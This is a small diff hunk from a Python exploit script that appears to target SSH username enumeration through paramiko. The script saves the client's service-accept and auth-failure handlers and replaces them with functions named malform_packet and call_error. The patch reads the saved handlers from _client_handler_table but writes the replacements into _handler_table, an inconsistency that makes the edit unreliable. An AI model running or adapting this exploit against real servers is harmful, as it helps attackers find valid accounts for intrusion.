@@ -50,8 +50,8 @@ def exploit(hostname, username, port, validuser = ""):
         return result
         
     # assign functions to respective handlers and add a backup
-    old_SERVICE_ACCEPT = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
-    old_USERAUTH_FAILURE = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE]
+    old_SERVICE_ACCEPT = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
+    old_USERAUTH_FAILURE = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE]
     paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
     paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
 
